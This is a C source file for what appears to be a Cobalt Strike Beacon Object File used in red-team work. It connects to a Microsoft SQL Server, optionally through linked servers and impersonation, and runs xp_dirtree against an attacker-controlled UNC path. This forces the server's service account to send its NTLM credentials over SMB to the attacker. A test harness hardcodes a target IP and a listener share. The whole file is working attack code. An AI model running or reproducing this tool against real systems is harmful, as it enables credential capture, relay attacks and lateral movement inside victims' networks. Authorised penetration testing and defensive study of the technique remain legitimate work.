#include <windows.h>
#include "bofdefs.h"
#include "base.c"
#include "sql.c"


void CoerceSmb(char* server, char* database, char* link, char* impersonate, char* listener)
{
    SQLHENV env		= NULL;
    SQLHSTMT stmt 	= NULL;
	SQLHDBC dbc 	= NULL;


    if (link == NULL)
	{
		dbc = ConnectToSqlServer(&env, server, database);
	}
	else
	{
		dbc = ConnectToSqlServer(&env, server, NULL);
	}

    if (dbc == NULL) {
		goto END;
	}

	//
	// allocate statement handle
	//
	ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);

	char* linkPrefix = "SELECT 1; ";
	char* prefix = "EXEC master..xp_dirtree '";
	char* suffix = "';";
	char * query;

	if (link == NULL)
	{
		internal_printf("[*] Triggering SMB request to %s on %s\n\n", listener, server);
		query = (char*)intAlloc((MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1) * sizeof(char));
		MSVCRT$strcpy(query, prefix);
	}
	else
	{
		internal_printf("[*] Triggering SMB request to %s on %s via %s\n\n", listener, link, server);
		query = (char*)intAlloc((MSVCRT$strlen(linkPrefix) + MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1) * sizeof(char));
		MSVCRT$strcpy(query, linkPrefix);
		MSVCRT$strcat(query, prefix);
	}
	
	MSVCRT$strcat(query, listener);
	MSVCRT$strcat(query, suffix);

	//
	// Run the query
	//
	if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE)){
		goto END;
	}

	internal_printf("[*] SMB request triggered\n");

END:
	ODBC32$SQLCloseCursor(stmt);
	DisconnectSqlServer(env, dbc, stmt);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	char* server;
	char* database;
	char* link;
	char* impersonate;
	char* listener;

	//
	// parse beacon args 
	//
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	
	server	 	= BeaconDataExtract(&parser, NULL);
	database 	= BeaconDataExtract(&parser, NULL);
	link 		= BeaconDataExtract(&parser, NULL);
	impersonate = BeaconDataExtract(&parser, NULL);
	listener 	= BeaconDataExtract(&parser, NULL);

	server = *server == 0 ? "localhost" : server;
	database = *database == 0 ? "master" : database;
	link = *link  == 0 ? NULL : link;
	impersonate = *impersonate == 0 ?  NULL : impersonate;
	
	if(!bofstart())
	{
		return;
	}

	if (UsingLinkAndImpersonate(link, impersonate))
	{
		return;
	}
	
	CoerceSmb(server, database, link, impersonate, listener);

	printoutput(TRUE);
};

#else

int main()
{
	CoerceSmb("192.168.0.215", "master", NULL, NULL, "\\\\10.2.99.1");
}

#endif
